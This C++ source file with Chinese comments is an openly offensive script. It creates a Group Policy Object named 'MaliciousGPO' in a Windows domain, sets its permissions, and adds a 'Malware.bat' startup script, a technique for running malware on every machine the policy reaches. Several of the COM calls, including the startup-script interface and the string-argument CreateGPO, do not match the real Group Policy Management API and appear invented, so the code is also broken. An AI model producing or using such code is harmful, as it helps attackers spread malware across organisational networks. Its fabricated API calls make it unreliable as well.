#include <windows.h>
#include <iostream>
#include <atlbase.h>
#include <gpmgmt.h>

int main() {
    // 初始化COM库
    CoInitialize(NULL);

    // 创建GPM对象
    CComPtr<IGPM> pGPM;
    HRESULT hr = CoCreateInstance(CLSID_GPMgmt, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pGPM));
    if (FAILED(hr)) {
        std::cerr << "Failed to create GPM object." << std::endl;
        CoUninitialize();
        return 1;
    }

    // 获取域对象
    CComPtr<IGPMDomain> pDomain;
    hr = pGPM->GetDomain(L"domain.local", NULL, NULL, NULL, &pDomain);
    if (FAILED(hr)) {
        std::cerr << "Failed to get domain object." << std::endl;
        CoUninitialize();
        return 1;
    }

    // 创建GPO对象
    CComPtr<IGPMGPO> pGPO;
    hr = pDomain->CreateGPO(L"MaliciousGPO", &pGPO);
    if (FAILED(hr)) {
        std::cerr << "Failed to create GPO object." << std::endl;
        CoUninitialize();
        return 1;
    }

    // 设置GPO安全描述符
    hr = pGPO->SetSecurityDescriptor(L"O:BAG:BAD:(A;;GA;;;BA)");
    if (FAILED(hr)) {
        std::cerr << "Failed to set security descriptor." << std::endl;
        CoUninitialize();
        return 1;
    }

    // 配置启动脚本
    CComPtr<IGPMStartupScript> pStartupScript;
    hr = pGPO->GetStartupScript(&pStartupScript);
    if (FAILED(hr)) {
        std::cerr << "Failed to get startup script object." << std::endl;
        CoUninitialize();
        return 1;
    }

    hr = pStartupScript->AddScript(L"C:\\Path\\To\\Malware.bat");
    if (FAILED(hr)) {
        std::cerr << "Failed to add startup script." << std::endl;
        CoUninitialize();
        return 1;
    }

    std::cout << "Group Policy Object created and startup script configured successfully." << std::endl;

    // 释放COM库
    CoUninitialize();

    return 0;
}
